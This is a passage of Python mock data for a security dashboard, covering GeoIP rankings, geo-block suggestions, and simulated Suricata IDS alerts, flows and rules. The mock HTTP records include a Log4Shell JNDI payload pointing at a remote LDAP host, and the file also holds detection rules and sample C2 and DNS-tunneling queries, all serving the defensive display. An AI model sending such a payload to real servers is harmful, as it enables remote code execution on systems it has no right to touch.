    "country_code": "UNKNOWN", "country_name": "Unknown",
    "city": None, "latitude": None, "longitude": None,
    "asn": None, "as_name": None,
    "network_type": None, "is_datacenter": False, "is_tor": False,
}

_GEOIP_LOCAL = {
    "country_code": "LOCAL", "country_name": "Red Local",
    "city": None, "latitude": None, "longitude": None,
    "asn": None, "as_name": None,
    "network_type": "Local", "is_datacenter": False, "is_tor": False,
}


def _is_private_ip(ip: str) -> bool:
    """True si la IP pertenece a un rango privado (RFC 1918 / loopback)."""
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    try:
        a, b = int(parts[0]), int(parts[1])
    except ValueError:
        return False
    return (
        a == 10
        or (a == 172 and 16 <= b <= 31)
        or (a == 192 and b == 168)
        or a == 127
    )


class _GeoIPMockData:
    """GeoIP mock data namespace, attached as MockData.geoip."""

    @staticmethod
    def lookup(ip: str) -> dict:
        """Return mock GeoIP result for a single IP."""
        if _is_private_ip(ip):
            return {"ip": ip, "raw_available": False, **_GEOIP_LOCAL}
        result = _GEOIP_DATA.get(ip, _GEOIP_DEFAULT)
        return {"ip": ip, "raw_available": False, **result}

    @staticmethod
    def lookup_bulk(ips: list[str]) -> list[dict]:
        """Return mock GeoIP results for a list of IPs (deduped)."""
        seen: set[str] = set()
        results = []
        for ip in ips:
            if ip not in seen:
                seen.add(ip)
                results.append(_GeoIPMockData.lookup(ip))
        return results

    @staticmethod
    def top_countries(limit: int = 10, source: str = "all") -> dict:
        """Aggregated top attacking countries (mock -- crosses CrowdSec + Wazuh)."""
        countries = [
            {
                "country_code": "CN", "country_name": "China",
                "count": 18, "percentage": 35.3,
                "sources": {"crowdsec": 12, "wazuh": 5, "mikrotik": 1},
                "top_asns": ["AS4134 Chinanet", "AS4812 China Telecom"],
            },
            {
                "country_code": "RU", "country_name": "Russia",
                "count": 14, "percentage": 27.5,
                "sources": {"crowdsec": 9, "wazuh": 4, "mikrotik": 1},
                "top_asns": ["AS8359 MTS PJSC", "AS35470 Serverius LLC"],
            },
            {
                "country_code": "DE", "country_name": "Germany",
                "count": 7, "percentage": 13.7,
                "sources": {"crowdsec": 7, "wazuh": 0, "mikrotik": 0},
                "top_asns": ["AS60729 Tor Exit Node"],
            },
            {
                "country_code": "NL", "country_name": "Netherlands",
                "count": 6, "percentage": 11.8,
                "sources": {"crowdsec": 5, "wazuh": 1, "mikrotik": 0},
                "top_asns": ["AS206728 Media Land LLC"],
            },
            {
                "country_code": "IN", "country_name": "India",
                "count": 3, "percentage": 5.9,
                "sources": {"crowdsec": 2, "wazuh": 1, "mikrotik": 0},
                "top_asns": ["AS38266 Vodafone India"],
            },
            {
                "country_code": "BR", "country_name": "Brazil",
                "count": 2, "percentage": 3.9,
                "sources": {"crowdsec": 2, "wazuh": 0, "mikrotik": 0},
                "top_asns": ["AS27699 TELEFONICA BRASIL"],
            },
            {
                "country_code": "UA", "country_name": "Ukraine",
                "count": 1, "percentage": 2.0,
                "sources": {"crowdsec": 1, "wazuh": 0, "mikrotik": 0},
                "top_asns": ["AS57024 Aeroflot Digital"],
            },
        ]
        return {
            "countries": countries[:limit],
            "total_ips": 51,
            "source": source,
            "generated_at": _NOW.isoformat(),
        }

    @staticmethod
    def top_asns(limit: int = 10) -> dict:
        """Top attacking ASNs ranked by IP count."""
        asns = [
            {"asn": 4134,   "as_name": "AS4134 Chinanet",          "country_code": "CN", "count": 10, "is_datacenter": False},
            {"asn": 8359,   "as_name": "AS8359 MTS PJSC",           "country_code": "RU", "count": 8,  "is_datacenter": False},
            {"asn": 60729,  "as_name": "AS60729 Tor Exit Node",     "country_code": "DE", "count": 7,  "is_datacenter": True},
            {"asn": 206728, "as_name": "AS206728 Media Land LLC",   "country_code": "NL", "count": 6,  "is_datacenter": True},
            {"asn": 35470,  "as_name": "AS35470 Serverius LLC",     "country_code": "RU", "count": 5,  "is_datacenter": True},
            {"asn": 38266,  "as_name": "AS38266 Vodafone India",    "country_code": "IN", "count": 3,  "is_datacenter": False},
            {"asn": 27699,  "as_name": "AS27699 TELEFONICA BRASIL", "country_code": "BR", "count": 2,  "is_datacenter": False},
        ]
        return {
            "asns": asns[:limit],
            "total_ips": 41,
            "generated_at": _NOW.isoformat(),
        }

    @staticmethod
    def geo_block_suggestions() -> list[dict]:
        """Automatic geo-block suggestions based on threat intelligence."""
        return [
            {
                "id": "block-cn",
                "type": "country",
                "target": "CN",
                "target_name": "China",
                "reason": "18 IPs bloqueadas por CrowdSec + 5 alertas Wazuh SSH brute-force en las ultimas 24h",
                "evidence": {
                    "crowdsec_ips": ["203.0.113.45", "203.0.113.99"],
                    "wazuh_alerts": 45,
                    "affected_agents": ["lubuntu_desk_1", "lubuntu_desk_2"],
                },
                "risk_level": "high",
                "estimated_block_count": 18,
                "suggested_duration": "24h",
            },
            {
                "id": "block-ru",
                "type": "country",
                "target": "RU",
                "target_name": "Russia",
                "reason": "14 IPs con decisiones activas CrowdSec -- SSH brute-force y port scanning",
                "evidence": {
                    "crowdsec_ips": ["198.51.100.22", "5.188.206.45"],
                    "wazuh_alerts": 22,
                    "affected_agents": ["lubuntu_desk_2"],
                },
                "risk_level": "high",
                "estimated_block_count": 14,
                "suggested_duration": "48h",
            },
            {
                "id": "block-as60729",
                "type": "asn",
                "target": "AS60729",
                "target_name": "AS60729 Tor Exit Node",
                "reason": "7 IPs Tor identificadas -- background noise alto, HTTP probing continuo",
                "evidence": {
                    "crowdsec_ips": ["185.220.101.50"],
                    "wazuh_alerts": 85,
                    "affected_agents": [],
                },
                "risk_level": "medium",
                "estimated_block_count": 7,
                "suggested_duration": "7d",
            },
        ]

    @staticmethod
    def db_status() -> dict:
        """Status of the GeoLite2 database files (mock mode = not loaded)."""
        return {
            "city_db": {
                "loaded": False,
                "path": "backend/data/geoip/GeoLite2-City.mmdb",
                "build_epoch": None,
                "description": "GeoLite2-City -- not downloaded",
            },
            "asn_db": {
                "loaded": False,
                "path": "backend/data/geoip/GeoLite2-ASN.mmdb",
                "build_epoch": None,
                "description": "GeoLite2-ASN -- not downloaded",
            },
            "mock_mode": True,
            "cache_size": 0,
            "cache_ttl_seconds": 3600,
        }



# Attach as class-level attribute so usage is MockData.geoip.lookup(ip)
MockData.geoip = _GeoIPMockData


# ── Suricata Mock Data ────────────────────────────────────────────────────────
# Coherencia con mock existente:
#   203.0.113.45  → atacante brute-force (Wazuh + CrowdSec + MikroTik)
#   198.51.100.22 → atacante port-scan (Wazuh + CrowdSec + MikroTik)
#   45.142.212.100 → atacante CrowdSec-only (ahora también detectado por Suricata)
#   172.16.200.5  → lateral movement (solo Suricata — interno sospechoso)

_SURICATA_ALERTS = [
    {
        "id": "sur-0001",
        "timestamp": _ts(3),
        "signature_id": 2001219,
        "signature": "ET SCAN Potential SSH Scan",
        "category": "Attempted Information Leak",
        "severity": 2,
        "protocol": "TCP",
        "src_ip": "198.51.100.22",
        "src_port": 54321,
        "dst_ip": "192.168.88.50",
        "dst_port": 22,
        "action": "alert",
        "flow_id": "flow-001",
        "app_proto": "ssh",
        "mitre_technique": "T1046",
        "mitre_name": "Network Service Discovery",
        "wazuh_alert_id": "mock-00012",
        "crowdsec_decision_id": "cs-2",
        "geo": {"country": "RU", "country_name": "Russia", "as_name": "AS8359 MTS PJSC"},
    },
    {
        "id": "sur-0002",
        "timestamp": _ts(7),
        "signature_id": 2006546,
        "signature": "ET POLICY SSH session in progress on Expected Port",
        "category": "Misc Activity",
        "severity": 3,
        "protocol": "TCP",
        "src_ip": "203.0.113.45",
        "src_port": 50234,
        "dst_ip": "192.168.88.10",
        "dst_port": 22,
        "action": "alert",
        "flow_id": "flow-002",
        "app_proto": "ssh",
        "mitre_technique": "T1110",
        "mitre_name": "Brute Force",
        "wazuh_alert_id": "mock-00000",
        "crowdsec_decision_id": "cs-1",
        "geo": {"country": "CN", "country_name": "China", "as_name": "AS4134 Chinanet"},
    },
    {
        "id": "sur-0003",
        "timestamp": _ts(12),
        "signature_id": 2008581,
        "signature": "ET EXPLOIT Possible CVE-2021-44228 Log4j RCE Inbound",
        "category": "Attempted Administrator Privilege Gain",
        "severity": 1,
        "protocol": "TCP",
        "src_ip": "45.142.212.100",
        "src_port": 8443,
        "dst_ip": "192.168.88.50",
        "dst_port": 8080,
        "action": "drop",
        "flow_id": "flow-003",
        "app_proto": "http",
        "mitre_technique": "T1190",
        "mitre_name": "Exploit Public-Facing Application",
        "wazuh_alert_id": None,
        "crowdsec_decision_id": "cs-4",
        "geo": {"country": "NL", "country_name": "Netherlands", "as_name": "AS206728 Media Land LLC"},
    },
    {
        "id": "sur-0004",
        "timestamp": _ts(18),
        "signature_id": 2019284,
        "signature": "ET MALWARE Possible Lateral Movement - SMB to Multiple Internal Hosts",
        "category": "A Network Trojan was Detected",
        "severity": 1,
        "protocol": "TCP",
        "src_ip": "172.16.200.5",
        "src_port": 445,
        "dst_ip": "192.168.88.10",
        "dst_port": 445,
        "action": "alert",
        "flow_id": "flow-004",
        "app_proto": "smb",
        "mitre_technique": "T1021",
        "mitre_name": "Remote Services",
        "wazuh_alert_id": None,
        "crowdsec_decision_id": None,
        "geo": None,
    },
    {
        "id": "sur-0005",
        "timestamp": _ts(25),
        "signature_id": 2014726,
        "signature": "ET DNS Query for .onion proxy Domain (tor2web.org)",
        "category": "Potentially Bad Traffic",
        "severity": 2,
        "protocol": "UDP",
        "src_ip": "192.168.88.20",
        "src_port": 49200,
        "dst_ip": "8.8.8.8",
        "dst_port": 53,
        "action": "alert",
        "flow_id": "flow-005",
        "app_proto": "dns",
        "mitre_technique": "T1090",
        "mitre_name": "Proxy",
        "wazuh_alert_id": None,
        "crowdsec_decision_id": None,
        "geo": None,
    },
    {
        "id": "sur-0006",
        "timestamp": _ts(30),
        "signature_id": 2009582,
        "signature": "ET SCAN NMAP -sA packet Scan",
        "category": "Attempted Information Leak",
        "severity": 2,
        "protocol": "TCP",
        "src_ip": "198.51.100.22",
        "src_port": 54400,
        "dst_ip": "192.168.88.1",
        "dst_port": 80,
        "action": "alert",
        "flow_id": "flow-006",
        "app_proto": "http",
        "mitre_technique": "T1046",
        "mitre_name": "Network Service Discovery",
        "wazuh_alert_id": "mock-00006",
        "crowdsec_decision_id": "cs-2",
        "geo": {"country": "RU", "country_name": "Russia", "as_name": "AS8359 MTS PJSC"},
    },
    {
        "id": "sur-0007",
        "timestamp": _ts(42),
        "signature_id": 2016141,
        "signature": "ET MALWARE CryptBot Loader HTTP GET",
        "category": "A Network Trojan was Detected",
        "severity": 1,
        "protocol": "TCP",
        "src_ip": "192.168.88.10",
        "src_port": 49300,
        "dst_ip": "203.0.113.99",
        "dst_port": 443,
        "action": "alert",
        "flow_id": "flow-007",
        "app_proto": "tls",
        "mitre_technique": "T1071",
        "mitre_name": "Application Layer Protocol",
        "wazuh_alert_id": "mock-00005",
        "crowdsec_decision_id": None,
        "geo": {"country": "US", "country_name": "United States", "as_name": "AS30083 Cloudflare"},
    },
    {
        "id": "sur-0008",
        "timestamp": _ts(55),
        "signature_id": 2101411,
        "signature": "GPL SNMP public access udp",
        "category": "Attempted Information Leak",
        "severity": 2,
        "protocol": "UDP",
        "src_ip": "198.51.100.22",
        "src_port": 161,
        "dst_ip": "192.168.88.1",
        "dst_port": 161,
        "action": "alert",
        "flow_id": "flow-008",
        "app_proto": None,
        "mitre_technique": "T1046",
        "mitre_name": "Network Service Discovery",
        "wazuh_alert_id": None,
        "crowdsec_decision_id": "cs-2",
        "geo": {"country": "RU", "country_name": "Russia", "as_name": "AS8359 MTS PJSC"},
    },
]

_SURICATA_FLOWS = [
    {
        "id": "flow-001", "timestamp": _ts(3), "protocol": "TCP",
        "src_ip": "198.51.100.22", "src_port": 54321,
        "dst_ip": "192.168.88.50", "dst_port": 22,
        "bytes_toserver": 2048, "bytes_toclient": 512,
        "pkts_toserver": 12, "pkts_toclient": 4,
        "app_proto": "ssh", "state": "established",
        "duration_ms": 3400, "has_alert": True,
    },
    {
        "id": "flow-002", "timestamp": _ts(7), "protocol": "TCP",
        "src_ip": "203.0.113.45", "src_port": 50234,
        "dst_ip": "192.168.88.10", "dst_port": 22,
        "bytes_toserver": 1200, "bytes_toclient": 800,
        "pkts_toserver": 8, "pkts_toclient": 6,
        "app_proto": "ssh", "state": "closed",
        "duration_ms": 1800, "has_alert": True,
    },
    {
        "id": "flow-003", "timestamp": _ts(12), "protocol": "TCP",
        "src_ip": "45.142.212.100", "src_port": 8443,
        "dst_ip": "192.168.88.50", "dst_port": 8080,
        "bytes_toserver": 850, "bytes_toclient": 0,
        "pkts_toserver": 5, "pkts_toclient": 0,
        "app_proto": "http", "state": "new",
        "duration_ms": 250, "has_alert": True,
    },
    {
        "id": "flow-010", "timestamp": _ts(1), "protocol": "TCP",
        "src_ip": "192.168.88.11", "src_port": 52000,
        "dst_ip": "8.8.8.8", "dst_port": 443,
        "bytes_toserver": 12400, "bytes_toclient": 98000,
        "pkts_toserver": 45, "pkts_toclient": 120,
        "app_proto": "tls", "state": "established",
        "duration_ms": 45000, "has_alert": False,
    },
    {
        "id": "flow-011", "timestamp": _ts(2), "protocol": "TCP",
        "src_ip": "192.168.88.20", "src_port": 53100,
        "dst_ip": "192.168.88.50", "dst_port": 55000,
        "bytes_toserver": 3200, "bytes_toclient": 15600,
        "pkts_toserver": 22, "pkts_toclient": 88,
        "app_proto": "http", "state": "established",
        "duration_ms": 12000, "has_alert": False,
    },
]

_SURICATA_DNS_QUERIES = [
    {
        "id": "dns-001", "timestamp": _ts(5), "src_ip": "192.168.88.20",
        "src_port": 49200, "dst_ip": "8.8.8.8", "dst_port": 53,
        "query": "tor2web.org", "type": "A", "response": "NXDOMAIN",
        "is_suspicious": True, "flow_id": "flow-005",
    },
    {
        "id": "dns-002", "timestamp": _ts(8), "src_ip": "192.168.88.10",
        "src_port": 50100, "dst_ip": "8.8.8.8", "dst_port": 53,
        "query": "malware-c2.net", "type": "A", "response": "127.0.0.1",
        "is_suspicious": True, "flow_id": "flow-012",
    },
    {
        "id": "dns-003", "timestamp": _ts(10), "src_ip": "192.168.88.11",
        "src_port": 50200, "dst_ip": "8.8.8.8", "dst_port": 53,
        "query": "google.com", "type": "A", "response": "142.250.80.46",
        "is_suspicious": False, "flow_id": "flow-013",
    },
    {
        "id": "dns-004", "timestamp": _ts(15), "src_ip": "192.168.88.20",
        "src_port": 50300, "dst_ip": "8.8.8.8", "dst_port": 53,
        "query": "aabbccddee.dnscat.example.com", "type": "TXT", "response": "",
        "is_suspicious": True, "flow_id": "flow-014",
    },
    {
        "id": "dns-005", "timestamp": _ts(20), "src_ip": "192.168.88.50",
        "src_port": 50400, "dst_ip": "8.8.8.8", "dst_port": 53,
        "query": "ubuntu.com", "type": "A", "response": "185.125.190.20",
        "is_suspicious": False, "flow_id": "flow-015",
    },
]

_SURICATA_HTTP_TRANSACTIONS = [
    {
        "id": "http-001", "timestamp": _ts(12), "src_ip": "45.142.212.100",
        "dst_ip": "192.168.88.50", "dst_port": 8080,
        "hostname": "192.168.88.50", "url": "/?x=${jndi:ldap://45.142.212.100/exp}",
        "method": "GET", "status": 400,
        "user_agent": "Mozilla/5.0 (Java Log4Shell exploit)",
        "content_type": "", "response_bytes": 0,
        "is_suspicious": True, "flow_id": "flow-003",
    },
    {
        "id": "http-002", "timestamp": _ts(20), "src_ip": "192.168.88.10",
        "dst_ip": "203.0.113.99", "dst_port": 80,
        "hostname": "evil-phishing.com", "url": "/login",
        "method": "GET", "status": 200,
        "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "content_type": "text/html", "response_bytes": 4500,
        "is_suspicious": True, "flow_id": "flow-016",
    },
    {
        "id": "http-003", "timestamp": _ts(25), "src_ip": "192.168.88.11",
        "dst_ip": "8.8.8.8", "dst_port": 80,
        "hostname": "detectportal.firefox.com", "url": "/success.txt",
        "method": "GET", "status": 200,
        "user_agent": "Mozilla/5.0 Firefox/115.0",
        "content_type": "text/plain", "response_bytes": 8,
        "is_suspicious": False, "flow_id": "flow-017",
    },
    {
        "id": "http-004", "timestamp": _ts(35), "src_ip": "198.51.100.22",
        "dst_ip": "192.168.88.50", "dst_port": 55000,
        "hostname": "192.168.88.50", "url": "/api/v2/agents",
        "method": "GET", "status": 401,
        "user_agent": "python-requests/2.28.0",
        "content_type": "application/json", "response_bytes": 120,
        "is_suspicious": True, "flow_id": "flow-018",
    },
]

_SURICATA_TLS_HANDSHAKES = [
    {
        "id": "tls-001", "timestamp": _ts(7), "src_ip": "192.168.88.10",
        "dst_ip": "203.0.113.45", "dst_port": 443,
        "sni": "203.0.113.45", "version": "TLS 1.2",
        "ja3": "769,47-53-5-10,0-65281,0-23-65281", "ja3s": None,
        "is_suspicious": True, "flow_id": "flow-019",
    },
    {
        "id": "tls-002", "timestamp": _ts(15), "src_ip": "192.168.88.11",
        "dst_ip": "8.8.8.8", "dst_port": 443,
        "sni": "google.com", "version": "TLS 1.3",
        "ja3": "771,4865-4866-4867-49195-49199,0-23-65281-43-51,29-23-24",
        "ja3s": None, "is_suspicious": False, "flow_id": "flow-010",
    },
    {
        "id": "tls-003", "timestamp": _ts(42), "src_ip": "192.168.88.10",
        "dst_ip": "203.0.113.99", "dst_port": 443,
        "sni": "malware-c2.net", "version": "TLS 1.2",
        "ja3": "769,47-53-5-10,0-65281,0-23-65281", "ja3s": None,
        "is_suspicious": True, "flow_id": "flow-007",
    },
]

_SURICATA_RULES = [
    {
        "sid": 2001219, "enabled": True, "ruleset": "emerging-threats-open",
        "category": "ET SCAN",
        "rule": 'alert tcp any any -> $HOME_NET 22 (msg:"ET SCAN Potential SSH Scan"; flow:to_server; flags:S; threshold: type both, track by_src, count 5, seconds 120; classtype:attempted-recon; sid:2001219; rev:6;)',
        "hits_total": 145, "hits_last_hour": 12, "last_hit": _ts(3),
    },
    {
        "sid": 2008581, "enabled": True, "ruleset": "emerging-threats-open",
        "category": "ET EXPLOIT",
        "rule": 'alert http any any -> $HTTP_SERVERS any (msg:"ET EXPLOIT Possible CVE-2021-44228 Log4j RCE Inbound"; flow:established,to_server; content:"${jndi:"; nocase; http_uri; classtype:attempted-admin; sid:2008581; rev:5;)',
        "hits_total": 3, "hits_last_hour": 1, "last_hit": _ts(12),
    },
    {
        "sid": 2014726, "enabled": True, "ruleset": "emerging-threats-open",
        "category": "ET DNS",
        "rule": 'alert dns any any -> any any (msg:"ET DNS Query for .onion proxy Domain (tor2web.org)"; dns.query; content:"tor2web.org"; nocase; classtype:bad-unknown; sid:2014726; rev:5;)',
        "hits_total": 8, "hits_last_hour": 1, "last_hit": _ts(25),
    },
    {
        "sid": 2019284, "enabled": True, "ruleset": "emerging-threats-open",
        "category": "ET MALWARE",
        "rule": 'alert smb any any -> $HOME_NET any (msg:"ET MALWARE Possible Lateral Movement - SMB to Multiple Internal Hosts"; flow:to_server,established; classtype:trojan-activity; sid:2019284; rev:3;)',
        "hits_total": 1, "hits_last_hour": 1, "last_hit": _ts(18),
    },
    {
        "sid": 2006546, "enabled": True, "ruleset": "emerging-threats-open",
        "category": "ET POLICY",
        "rule": 'alert tcp any any -> $HOME_NET 22 (msg:"ET POLICY SSH session in progress on Expected Port"; flow:established; classtype:policy-violation; sid:2006546; rev:3;)',
        "hits_total": 234, "hits_last_hour": 4, "last_hit": _ts(7),
    },
    {
        "sid": 9000001, "enabled": False, "ruleset": "local",
        "category": "LOCAL",
        "rule": 'alert icmp any any -> $HOME_NET any (msg:"LOCAL ICMP ping detected"; itype:8; classtype:misc-activity; sid:9000001; rev:1;)',
        "hits_total": 0, "hits_last_hour": 0, "last_hit": None,
    },
]

_SURICATA_RULESETS = [
    {
        "name": "emerging-threats-open",
        "description": "Emerging Threats Open Ruleset — comunidad libre",
        "rules_count": 42892,
        "enabled_count": 8741,
        "last_updated": _ts(24 * 60),
        "version": "7.0.4-20240415",
        "is_active": True,
    },
    {
        "name": "local",
        "description": "Reglas locales personalizadas del laboratorio",
        "rules_count": 12,
        "enabled_count": 8,
        "last_updated": _ts(72 * 60),
        "version": "local-1.0",
        "is_active": True,
    },
    {
        "name": "emerging-threats-pro",
        "description": "Emerging Threats PRO (requiere licencia)",
        "rules_count": 0,
        "enabled_count": 0,
        "last_updated": None,
        "version": None,
        "is_active": False,
    },
]


class _SuricataMockData:
    """Mock data para Suricata IDS/IPS/NSM.\n\n    Coherente con entidades existentes:\n    - 203.0.113.45  → brute-force (IPs reusadas de _ATTACKERS)\n    - 198.51.100.22 → port-scan\n    - 45.142.212.100 → Log4j exploit\n    - 172.16.200.5  → lateral movement interno\n    """

    @staticmethod
    def engine_stats() -> dict:
        """Estado del motor Suricata."""
        return {
            "running": True,
            "mode": "ids",  # "ids", "ips", "nsm"
            "version": "7.0.4",
            "uptime_seconds": 3 * 24 * 3600 + 12 * 3600 + 45 * 60,
            "uptime_label": "3d 12h 45m",
            "threads": {
                "detect": 4,
                "output": 2,
                "capture": 1,
            },
            "packets_captured": 14_523_891,
            "packets_decoded": 14_522_108,
            "packets_dropped": 1_783,
            "alerts_total": 42,
            "flows_active": 187,
            "bytes_processed": 9_823_456_789,
            "interface": "ether1",
            "rules_loaded": 8_741,
            "rules_failed": 0,
            "last_reload": _ts(24 * 60),
            "mock": True,
        }

    @staticmethod
    def alerts(
        limit: int = 50,
        src_ip: str | None = None,
        dst_ip: str | None = None,
        category: str | None = None,
        severity: int | None = None,
        offset: int = 0,
    ) -> list[dict]:
        """Alertas IDS/IPS de Suricata."""
        result = list(_SURICATA_ALERTS)
        if src_ip:
            result = [a for a in result if a["src_ip"] == src_ip]
        if dst_ip:
            result = [a for a in result if a["dst_ip"] == dst_ip]
        if category:
            result = [a for a in result if category.lower() in a["category"].lower()]
        if severity is not None:
            result = [a for a in result if a["severity"] == severity]
        return result[offset: offset + limit]

    @staticmethod
    def alert_detail(alert_id: str) -> dict | None:
        """Detalle completo de una alerta."""
        return next((a for a in _SURICATA_ALERTS if a["id"] == alert_id), None)

    @staticmethod
    def alerts_timeline(minutes: int = 120) -> list[dict]:
        """Serie temporal de alertas por minuto (últimos N minutos)."""
        _r = _random_module.Random(12345)
        result = []
        for i in range(minutes):
            t = _NOW - timedelta(minutes=minutes - i)
            # Spikes coherentes con fases de ataque
            count_ids = _r.randint(0, 2)
            count_ips = 0
            if i in (15, 16, 30, 52, 53):
                count_ids += _r.randint(4, 8)
                count_ips += _r.randint(1, 2)
            result.append({
                "minute": t.strftime("%Y-%m-%dT%H:%M:00"),
                "count_ids": count_ids,
                "count_ips": count_ips,
            })
        return result

    @staticmethod
    def top_signatures(limit: int = 10) -> list[dict]:
        """Top firmas por número de hits."""
        return [
            {"sid": 2001219, "signature": "ET SCAN Potential SSH Scan",
             "category": "ET SCAN", "hits": 145, "last_hit": _ts(3)},
            {"sid": 2006546, "signature": "ET POLICY SSH session in progress on Expected Port",
             "category": "ET POLICY", "hits": 234, "last_hit": _ts(7)},
            {"sid": 2009582, "signature": "ET SCAN NMAP -sA packet Scan",
             "category": "ET SCAN", "hits": 22, "last_hit": _ts(30)},
            {"sid": 2014726, "signature": "ET DNS Query for .onion proxy Domain (tor2web.org)",
             "category": "ET DNS", "hits": 8, "last_hit": _ts(25)},
            {"sid": 2008581, "signature": "ET EXPLOIT Possible CVE-2021-44228 Log4j RCE Inbound",
             "category": "ET EXPLOIT", "hits": 3, "last_hit": _ts(12)},
            {"sid": 2019284, "signature": "ET MALWARE Possible Lateral Movement",
             "category": "ET MALWARE", "hits": 1, "last_hit": _ts(18)},
        ][:limit]

    @staticmethod
    def categories() -> list[dict]:
        """Distribución de alertas por categoría (para donut chart)."""
        return [
            {"category": "Attempted Information Leak", "count": 25, "color": "#f59e0b"},
            {"category": "A Network Trojan was Detected", "count": 8, "color": "#ef4444"},
            {"category": "Attempted Administrator Privilege Gain", "count": 4, "color": "#dc2626"},
            {"category": "Potentially Bad Traffic", "count": 3, "color": "#f97316"},
            {"category": "Misc Activity", "count": 2, "color": "#6b7280"},
        ]

    @staticmethod
    def flows(
        limit: int = 50,
        src_ip: str | None = None,
        proto: str | None = None,
        app_proto: str | None = None,
        has_alert: bool | None = None,
        offset: int = 0,
    ) -> list[dict]:
        """Flujos de red NSM."""
        result = list(_SURICATA_FLOWS)
        if src_ip:
            result = [f for f in result if f["src_ip"] == src_ip]
        if proto:
            result = [f for f in result if f["protocol"].upper() == proto.upper()]
        if app_proto:
            result = [f for f in result if f.get("app_proto") == app_proto]
        if has_alert is not None:
            result = [f for f in result if f["has_alert"] == has_alert]
        return result[offset: offset + limit]

    @staticmethod
    def flows_stats() -> dict:
        """Estadísticas agregadas de flujos."""
        return {
            "total_flows": 4821,
            "active_flows": 187,
            "top_protocols": [
                {"proto": "TCP", "count": 3500, "bytes": 9_000_000_000},
                {"proto": "UDP", "count": 1200, "bytes": 500_000_000},
                {"proto": "ICMP", "count": 121, "bytes": 12_000_000},
            ],
            "top_app_protos": [
                {"app_proto": "tls", "count": 1800, "bytes": 7_200_000_000},
                {"app_proto": "http", "count": 850, "bytes": 1_200_000_000},
                {"app_proto": "ssh", "count": 340, "bytes": 180_000_000},
                {"app_proto": "dns", "count": 1200, "bytes": 80_000_000},
                {"app_proto": "smb", "count": 45, "bytes": 320_000_000},
            ],
            "top_src_ips": [
                {"ip": "192.168.88.10", "flows": 980, "bytes": 2_300_000_000},
                {"ip": "192.168.88.11", "flows": 845, "bytes": 1_900_000_000},
                {"ip": "198.51.100.22", "flows": 312, "bytes": 45_000_000, "has_alerts": True},
                {"ip": "203.0.113.45", "flows": 89, "bytes": 12_000_000, "has_alerts": True},
            ],
            "top_dst_ports": [
                {"port": 443, "count": 1800},
                {"port": 80, "count": 850},
                {"port": 22, "count": 340},
                {"port": 53, "count": 1200},
                {"port": 445, "count": 45},
            ],
        }

    @staticmethod
    def dns_queries(limit: int = 50, suspicious_only: bool = False) -> list[dict]:
        """Consultas DNS capturadas."""
        result = list(_SURICATA_DNS_QUERIES)
        if suspicious_only:
            result = [q for q in result if q["is_suspicious"]]
        return result[:limit]

    @staticmethod
    def http_transactions(limit: int = 50, suspicious_only: bool = False) -> list[dict]:
        """Transacciones HTTP capturadas."""
        result = list(_SURICATA_HTTP_TRANSACTIONS)
        if suspicious_only:
            result = [h for h in result if h["is_suspicious"]]
        return result[:limit]

    @staticmethod
    def tls_handshakes(limit: int = 50, suspicious_only: bool = False) -> list[dict]:
        """Handshakes TLS capturados."""
        result = list(_SURICATA_TLS_HANDSHAKES)
        if suspicious_only:
            result = [t for t in result if t["is_suspicious"]]
        return result[:limit]

    @staticmethod
    def rules(
        limit: int = 100,
        enabled: bool | None = None,
        ruleset: str | None = None,
        category: str | None = None,
        offset: int = 0,
    ) -> list[dict]:
        """Reglas/firmas de Suricata."""
        result = list(_SURICATA_RULES)
        if enabled is not None:
            result = [r for r in result if r["enabled"] == enabled]
        if ruleset:
            result = [r for r in result if r["ruleset"] == ruleset]
        if category:
            result = [r for r in result if category.lower() in r["category"].lower()]
        return result[offset: offset + limit]

    @staticmethod
    def rule_detail(sid: int) -> dict | None:
        """Detalle de una regla por SID."""
        return next((r for r in _SURICATA_RULES if r["sid"] == sid), None)

    @staticmethod
    def rulesets() -> list[dict]:
        """Rulesets disponibles."""
        return list(_SURICATA_RULESETS)

    @staticmethod
    def correlation_crowdsec() -> list[dict]:
        """IPs con alertas en Suricata que tienen decisión activa en CrowdSec."""
        return [
            {
                "ip": "203.0.113.45",
                "suricata_alerts": 2,
                "suricata_signatures": ["ET POLICY SSH session in progress on Expected Port"],
                "crowdsec_decision_id": "cs-1",
                "crowdsec_scenario": "crowdsecurity/ssh-bf",
                "crowdsec_type": "ban",
                "correlation_type": "confirmed_threat",
                "geo": {"country": "CN", "country_name": "China", "as_name": "AS4134 Chinanet"},
            },
            {
                "ip": "198.51.100.22",
                "suricata_alerts": 3,
                "suricata_signatures": ["ET SCAN Potential SSH Scan", "ET SCAN NMAP -sA packet Scan", "GPL SNMP public access udp"],
                "crowdsec_decision_id": "cs-2",
                "crowdsec_scenario": "crowdsecurity/port-scan",
                "crowdsec_type": "ban",
                "correlation_type": "confirmed_threat",
                "geo": {"country": "RU", "country_name": "Russia", "as_name": "AS8359 MTS PJSC"},
            },
            {
                "ip": "45.142.212.100",
                "suricata_alerts": 1,
                "suricata_signatures": ["ET EXPLOIT Possible CVE-2021-44228 Log4j RCE Inbound"],
                "crowdsec_decision_id": "cs-4",
                "crowdsec_scenario": "crowdsecurity/wordpress-bf",
                "crowdsec_type": "ban",
                "correlation_type": "correlated",
                "geo": {"country": "NL", "country_name": "Netherlands", "as_name": "AS206728 Media Land LLC"},
            },
            {
                "ip": "172.16.200.5",
                "suricata_alerts": 1,
                "suricata_signatures": ["ET MALWARE Possible Lateral Movement - SMB to Multiple Internal Hosts"],
                "crowdsec_decision_id": None,
                "crowdsec_scenario": None,
                "crowdsec_type": None,
                "correlation_type": "suricata_only",
                "geo": None,
            },
        ]

    @staticmethod
    def correlation_wazuh() -> list[dict]:
        """Correlación temporal entre alertas Suricata y alertas Wazuh."""
        return [
            {
                "suricata_alert_id": "sur-0001",
                "suricata_signature": "ET SCAN Potential SSH Scan",
                "suricata_timestamp": _ts(3),
                "wazuh_alert_id": "mock-00006",
                "wazuh_description": "Port scan detected",
                "wazuh_timestamp": _ts(4),
                "wazuh_agent": "wazuh-server",
                "delta_seconds": 65,
                "correlation_strength": "high",
            },
            {
                "suricata_alert_id": "sur-0002",
                "suricata_signature": "ET POLICY SSH session in progress on Expected Port",
                "suricata_timestamp": _ts(7),
                "wazuh_alert_id": "mock-00000",
                "wazuh_description": "Authentication failure",
                "wazuh_timestamp": _ts(8),
                "wazuh_agent": "lubuntu_desk_1",
                "delta_seconds": 45,
                "correlation_strength": "high",
            },
        ]

    @staticmethod
